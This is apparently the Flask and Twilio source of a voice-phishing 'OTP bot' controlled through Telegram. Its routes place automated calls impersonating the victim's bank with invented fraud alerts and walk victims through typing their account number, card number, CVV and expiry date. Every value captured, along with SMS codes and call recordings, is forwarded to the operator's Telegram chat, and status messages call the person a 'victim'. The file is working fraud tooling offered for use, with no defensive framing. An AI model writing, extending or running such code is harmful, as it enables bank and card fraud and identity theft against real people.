@app.route("/actn/<userid>", methods=['GET', 'POST'])
def intro_act(userid):
    chat_id = userid
    bankname = fetch_bankname(userid)
    print(bankname)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatheractn/'+userid, finishOnKey='*', input="dtmf")
        gather.say(f"Hello, this is an automated call from {bankname}, we have detected suspicious activity on your card for a charge at Walmart for $87.61, If this was not you, please stay on the call, Please enter your bank account number followed by the star key to block this attempt")
        resp.append(gather)
        resp.redirect('/actn/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatheractn/<userid>", methods=['GET', 'POST'])
def save_account(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        resp.say("Thank you, this attempt has been blocked ! Goodbye.")
        choice = request.values['Digits']
        print(choice)
        save_accountnumber(choice, userid)
        bot.send_message(chat_id, f"The Collected Account Number is {choice} 🏦")
        return str(resp)
    else:
        bot.send_message(chat_id, "No Account Number was collected")
        return str(resp)


@app.route("/crdf/<userid>", methods=['GET', 'POST'])
def introcall(userid):
    chat_id = userid
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherdetails/'+userid, finishOnKey='*', input="dtmf", num_digits=1)
        # remember to test if value like 4 or 6 is entered what happens
        gather.say(
            f"Hello, this an automated call from {bankname}, We have declined your last purchase of $141.99 at Macy's, your account has been put on hold until we verify the ownership of the account, Press 1 followed by the star key to enter your 16 digit Card Number and block this attempt")
        resp.append(gather)
        resp.redirect('/crdf/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''


@app.route('/gatherdetails/<userid>', methods=['GET', 'POST'])
def gather(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        print(choice)
        if choice == '1':
            gather = Gather(action='/gathercdrno/'+userid, finishOnKey='*', input="dtmf")
            gather.say('Please input your 16 digit card number followed by the star key to block this attempt ')
            resp.append(gather)
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
            resp.redirect('/crdf/<userid>')
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/crdf/<userid>')

        return str(resp)

@app.route('/gathercdrno/<userid>', methods=['GET', 'POST'])
def gathercardno(userid):
    resp = VoiceResponse()
    chat_id = userid
    if 'Digits' in request.values:
            choice = request.values['Digits']
            save_cardnumber(choice, userid)
            bot.send_message(chat_id, f"Card #: {choice} 💳")
            gather = Gather(action='/gathercrdcvv/'+userid, finishOnKey='*', input="dtmf")
            gather.say('Please input the 3 numerical digits located on the back of your card followed by the star key')
            resp.append(gather)
            return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/crdf/<userid>')
    return str(resp)


@app.route('/gathercrdcvv/<userid>', methods=['GET', 'POST'])
def gathercvv(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        save_cardcvv(choice, userid)
        bot.send_message(chat_id, f"Card CVV: {choice}")
        gather = Gather(action='/finalthanks/'+userid, finishOnKey='*', input="dtmf")
        gather.say('Please input the expiry month and year shown on your card and press the star key')
        resp.append(gather)
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/crdf/<userid>')
    return str(resp)

@app.route("/custom/<userid>", methods=['GET', 'POST'])
def voice_custom(userid):
    chat_id = userid
    resp = VoiceResponse()
    script = fetch_script(userid)
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherCustom/'+userid, finishOnKey='#', input="dtmf")
        gather.say(f"{script}")
        resp.append(gather)
        resp.redirect('/custom/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatherCustom/<userid>", methods=['GET', 'POST'])
def voice_custom_options(userid):
    chat_id = userid
    resp = VoiceResponse()
    option_number = fetch_option_number(userid)
    print(option_number)
    option1 = fetch_option1(userid)
    print(option1)
    if 'Digits' in request.values:
        choice = request.values['Digits']
        print(choice)
        if choice == '1' and option_number == '2':
            gather = Gather(action='/gatheroption2/'+userid, finishOnKey='#', input="dtmf")
            gather.say(f'{option1}')
            resp.append(gather)
            return str(resp)
        elif choice == '1' and option_number == '1':
            gather = Gather(action='/customend1/'+userid, finishOnKey='#', input="dtmf")
            gather.say(f'{option1}')
            resp.append(gather)
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
            resp.redirect('/custom/<userid>')
            return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/custom/<userid>')

        return str(resp)

@app.route('/gatheroption2/<userid>', methods=['GET', 'POST'])
def gather_option_2(userid):
    chat_id = userid
    resp = VoiceResponse()
    option2 = fetch_option2(userid)
    if 'Digits' in request.values:
        numbercollected1 = request.values['Digits']
        print(numbercollected1)
        save_numbercollected1(numbercollected1, userid)
        bot.send_message(chat_id, f"The details collected for option 1 : {numbercollected1}")
        gather = Gather(action='/customend2/'+userid, finishOnKey='#', input="dtmf")
        gather.say(f"{option2}")
        resp.append(gather)
        resp.redirect('/custom/<userid>')
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/custom/<userid>')

        return str(resp)

@app.route('/customend1/<userid>', methods=['GET', 'POST'])
def custom_end_option1(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        numbercollected1 = request.values['Digits']
        print(numbercollected1)
        save_numbercollected1(numbercollected1, userid)
        bot.send_message(chat_id, f"The details collected for option 1 : {numbercollected1}")
        resp.say("Thank you ! Goodbye!")
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being very difficult, still trying 😤")
        resp.redirect('/custom/<userid>')
        return str(resp)

    return str(resp)

@app.route('/customend2/<userid>', methods=['GET', 'POST'])
def custom_end_option2(userid):
    resp = VoiceResponse()
    chat_id = userid
    if 'Digits' in request.values:
        numbercollected2 = request.values['Digits']
        print(numbercollected2)
        save_numbercollected2(numbercollected2, userid)
        bot.send_message(chat_id, f"The details collected for option 2 : {numbercollected2}")
        resp.say("Thank you, Goodbye!")
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/custom/<userid>')
        return str(resp)

    return str(resp)

@app.route('/finalthanks/<userid>', methods=['GET', 'POST'])
def finalthanks(userid):
    resp = VoiceResponse()
    chat_id = userid
    if 'Digits' in request.values:
        choice = request.values['Digits']
        save_cardexpiry(choice, userid)
        bot.send_message(chat_id, f"Card EXP: {choice}")
        resp.say(
            'Thank you for confirming your identity, your account will seize to be on hold if these details are verified. Good bye !')
    else:
        resp.say("Sorry, I do not understand that choice")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/crdf/<userid>')
    return str(resp)

@app.route('/statuscallback/<userid>',methods=['GET', 'POST'])
def handle_statuscallbacks(userid):
    chat_id1 = userid
    if 'CallStatus' in request.values:
        status = request.values['CallStatus']
        try:
            if status == 'ringing':
                bot.send_message(chat_id1, "*Call is ringing..*",parse_mode='Markdown')
            elif status == 'in-progress':
                bot.send_message(chat_id1, "*Call has been answered ✅*",parse_mode='Markdown')
            elif status == 'no-answer':
                bot.send_message(chat_id1, "*Call was not answered*",parse_mode='Markdown')
            elif status == 'busy':
                bot.send_message(chat_id1, "*The Target number is currently busy ❌\nMaybe you should try again later*",parse_mode='Markdown')
            elif status == 'failed':
                bot.send_message(chat_id1, "*Call failed ❌*",parse_mode='Markdown')
        except:
            bot.send_message(chat_id1, "*Sorry an error has occured\nYou Can Try Again✅\n Use /start To Continue*",parse_mode='Markdown')
        else:
            return 'ok'
    else:
        return 'ok'


@app.route('/statuscallback2/<userid>', methods=['GET', 'POST'])
def handle_statuscallbacks2(userid):
    chat_id = userid
    if 'SmsStatus' in request.values:
        status = request.values['SmsStatus']
        try:
            if status == 'delivered':
                bot.send_message(chat_id, "*Text has been delivered ✅*",parse_mode='Markdown')
            # elif status == 'undelivered' or 'failed':
            #     bot.send_message(chat_id, "Text could not be delivered\n\nPlease recheck the Phone-number")
            elif status == 'sent':
                bot.send_message(chat_id, "*Text has been sent..*",parse_mode='Markdown')
        except:
            bot.send_message(chat_id, "*Sorry an error has occured\nYou Can Try Again✅\n Use /start To Continue*",parse_mode='Markdown')

    else:
        return 'ok'

@app.route("/sms/", methods=['GET', 'POST'])
def incoming_sms():
    resp = MessagingResponse()
    resp.message("Success. Your identity has been confirmed and this attempt has been blocked. Please do not reply.\n\nMsg&Data rates may apply.")
    body = request.values.get('Body', None)
    phonenum = request.values.get('From', None)
    print(body)
    print(phonenum)
    userid = fetch_sms_userid(phonenum)
    bot.send_message(userid, f'The received code is {body} 💬')
    return str(resp)

@app.route('/details_rec/<userid>', methods=['GET', 'POST'])
def handle_recordings(userid):
    chat_id = userid
    if 'RecordingUrl' in request.values:
        audio = request.values['RecordingUrl']
        mp3_audiofile = f"{audio}.mp3"
        bot.send_audio(chat_id, mp3_audiofile)
    else:
        bot.send_message(chat_id, "An error has occured\nContact Admin @undefined_bot")
    return ''



if __name__ == '__main__':
    app.run(debug=True)



